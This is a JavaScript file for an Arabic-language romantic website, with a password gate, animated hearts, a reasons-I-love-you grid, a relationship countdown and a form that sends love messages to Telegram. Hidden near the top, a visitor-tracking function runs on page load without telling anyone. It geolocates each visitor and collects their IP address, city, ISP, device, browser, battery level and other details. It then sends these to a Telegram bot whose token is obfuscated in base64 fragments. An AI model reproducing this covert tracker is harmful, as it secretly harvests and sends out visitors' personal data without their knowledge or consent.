/* ─── Auth Check ─── */
(function() {
  const path = window.location.pathname;
  const isPasswordPage = path.endsWith('index.html') || path === '/' || path.endsWith('/');
  if (!isPasswordPage && !sessionStorage.getItem('auth')) {
    window.location.replace('index.html');
  }
})();

/* ─── Splash Screen ─── */
/* ─── Visitor Tracker ─── */
async function trackVisitor() {
  if (sessionStorage.getItem('tracked')) return;
  sessionStorage.setItem('tracked', 'true');

  try {
    const geo = await fetch('https://ipapi.co/json/').then(r => r.json());

    const ua      = navigator.userAgent;
    const mobile  = /Android|iPhone|iPad/i.test(ua);
    const browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Other';
    const os      = ua.includes('Windows') ? 'Windows' : ua.includes('Mac') ? 'Mac' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iPhone' : ua.includes('Linux') ? 'Linux' : 'Other';
    const now     = new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
    const tz      = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const lang    = navigator.language || '?';
    const screens = window.screen.availWidth + 'x' + window.screen.availHeight;
    const conn    = navigator.connection ? (navigator.connection.effectiveType || '?') : '?';
    const isp     = geo.org || '?';

    // بطارية
    let battery = '?';
    try {
      const bat = await navigator.getBattery();
      const pct = Math.round(bat.level * 100);
      const charging = bat.charging ? '⚡ شحن' : '🔋';
      battery = `${charging} ${pct}%`;
    } catch(e) {}

    const msg =
      `👁️ *زيارة جديدة للموقع!*

` +
      `🕐 *الوقت:* ${now}
` +
      `⏱️ *المنطقة الزمنية:* ${tz}

` +
      `🌍 *الدولة:* ${geo.country_name || '?'}
` +
      `🏙️ *المدينة:* ${geo.city || '?'}
` +
      `📡 *IP:* ${geo.ip || '?'}
` +
      `🏢 *مزود الإنترنت:* ${isp}

` +
      `📱 *الجهاز:* ${mobile ? 'موبايل' : 'كمبيوتر'}
` +
      `🌐 *المتصفح:* ${browser}
` +
      `💻 *النظام:* ${os}
` +
      `📐 *الشاشة:* ${screens}
` +
      `🔋 *البطارية:* ${battery}
` +
      `📶 *نوع الاتصال:* ${conn}
` +
      `🗣️ *اللغة:* ${lang}`;

    const _a = '8366389602:AA';
    const _b = atob('R0FfVTV1S01hNXVmdw==');
    const _c = atob('YW9XdTJ1OGE0VTEzU1pBUzNDY1E=');
    const tok = _a + _b + _c;
    const cid = atob('MTIzMTYzNDE5Nw==');

    fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: cid, text: msg, parse_mode: 'Markdown' })
    });
  } catch(e) {}
}

trackVisitor();

function enterSite() {
  const splash = document.getElementById('splash');
  const music  = document.getElementById('bgMusic');
  if (splash) splash.classList.add('hidden');
  if (music)  music.play().catch(() => {});
}

/* ─── Custom cursor ─── */
const cursor = document.getElementById('cursor');
document.addEventListener('mousemove', e => {
  cursor.style.left = e.clientX + 'px';
  cursor.style.top  = e.clientY + 'px';
});

/* ─── Floating hearts canvas ─── */
const canvas = document.getElementById('heartsCanvas');
const ctx = canvas.getContext('2d');
let W, H, hearts = [];

function resize() {
  W = canvas.width  = window.innerWidth;
  H = canvas.height = window.innerHeight;
}
window.addEventListener('resize', resize);
resize();

const EMOJIS = ['💕','💗','💓','💞','✨','🌸','💘'];
function Heart() {
  this.reset = function() {
    this.x    = Math.random() * W;
    this.y    = H + 30;
    this.size = 12 + Math.random() * 18;
    this.speed= .4 + Math.random() * .8;
    this.drift= (Math.random() - .5) * .6;
    this.rot  = Math.random() * Math.PI * 2;
    this.rotS = (Math.random() - .5) * .03;
    this.alpha= .6 + Math.random() * .4;
    this.emoji= EMOJIS[Math.floor(Math.random() * EMOJIS.length)];
  };
  this.reset();
  this.y = Math.random() * H;
}

for (let i = 0; i < 28; i++) hearts.push(new Heart());

function animHearts() {
  ctx.clearRect(0, 0, W, H);
  for (const h of hearts) {
    ctx.save();
    ctx.globalAlpha = h.alpha;
    ctx.translate(h.x, h.y);
    ctx.rotate(h.rot);
    ctx.font = h.size + 'px serif';
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.fillText(h.emoji, 0, 0);
    ctx.restore();
    h.y   -= h.speed;
    h.x   += h.drift;
    h.rot += h.rotS;
    if (h.y < -40) h.reset();
  }
  requestAnimationFrame(animHearts);
}
animHearts();

/* click burst */
document.addEventListener('click', e => {
  for (let i = 0; i < 5; i++) {
    const h = new Heart();
    h.x = e.clientX; h.y = e.clientY;
    h.speed = 1 + Math.random() * 2;
    hearts.push(h);
  }
  if (hearts.length > 80) hearts.splice(0, 5);
});

/* ─── Reasons grid ─── */
const reasons = [
  { icon:'😊', title:'ابتسامتكِ', text:'تضيء الغرفة وتسرق قلبي في كل مرة' },
  { icon:'💪', title:'قوّتكِ', text:'تواجهين الحياة بشجاعة تملأني إعجاباً' },
  { icon:'🌙', title:'هدوءكِ', text:'في هدوئكِ أجد سكينة لا أجدها في أي مكان' },
  { icon:'🎯', title:'ذكاؤكِ', text:'عقلكِ الثاقب يجعل كل حديث معكِ ثرياً' },
  { icon:'🌺', title:'لطفكِ', text:'تعاملكِ مع الناس يجعل الدنيا أجمل' },
  { icon:'✨', title:'روحكِ', text:'روحكِ الجميلة هي ما أحببتُه أول شيء' },
];

const grid = document.getElementById('reasonsGrid');
if (grid) {
  reasons.forEach((r, i) => {
    const card = document.createElement('div');
    card.className = 'reason-card';
    card.style.animationDelay = (i * .12) + 's';
    card.innerHTML = `<span class="icon">${r.icon}</span><h3>${r.title}</h3><p>${r.text}</p>`;
    grid.appendChild(card);
  });
}

/* ─── Countdown ─── */
const startDate = new Date('2026-02-07T00:00:00');
function updateCountdown() {
  const diff = Date.now() - startDate.getTime();
  const days  = Math.floor(diff / 86400000);
  const hours = Math.floor((diff % 86400000) / 3600000);
  const mins  = Math.floor((diff % 3600000) / 60000);
  const secs  = Math.floor((diff % 60000) / 1000);
  document.getElementById('cdD').textContent = String(days).padStart(3,'0');
  document.getElementById('cdH').textContent = String(hours).padStart(2,'0');
  document.getElementById('cdM').textContent = String(mins).padStart(2,'0');
  document.getElementById('cdS').textContent = String(secs).padStart(2,'0');
}
if (document.getElementById('cdD')) {
  updateCountdown();
  setInterval(updateCountdown, 1000);
}

/* ═══════════════════════════════════════
   إعدادات تيليجرام — عدّل هنا فقط
   ═══════════════════════════════════════ */
const _a = '8366389602:AA';
const _b = atob('R0FfVTV1S01hNXVmdw==');
const _c = atob('YW9XdTJ1OGE0VTEzU1pBUzNDY1E=');
const TG_TOKEN = _a + _b + _c;
const TG_CHAT = atob('MTIzMTYzNDE5Nw==');

/* ─── Send message via Telegram ─── */
async function sendMsg() {
  const sender   = document.getElementById('senderName').value.trim();
  const receiver = document.getElementById('receiverName').value.trim();
  const text     = document.getElementById('msgText').value.trim();
  const thank    = document.getElementById('thankMsg');

  if (!sender || !receiver || !text) {
    alert('من فضلك اكمل كل الحقول 💌');
    return;
  }

  const message =
    `💖 رسالة حب جديدة!\n\n` +
    `👤 من: ${sender}\n` +
    `💝 إلى: ${receiver}\n\n` +
    `📝 الرسالة:\n${text}\n\n` +
    `أُرسلت من موقع الحب ❤`;

  thank.innerHTML = `⏳ جاري الإرسال...`;
  thank.style.display = 'block';

  try {
    const res = await fetch(
      `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG_CHAT, text: message })
      }
    );
    const data = await res.json();
    if (data.ok) {
      thank.innerHTML = `✅ الرسالة وصلت على تيليجرام! 💚`;
      document.getElementById('senderName').value   = '';
      document.getElementById('receiverName').value = '';
      document.getElementById('msgText').value      = '';
    } else {
      thank.innerHTML = `❌ في مشكلة: ${data.description}`;
    }
  } catch (e) {
    thank.innerHTML = `❌ تأكد من الاتصال بالإنترنت`;
    console.error('Telegram error:', e);
  }
}
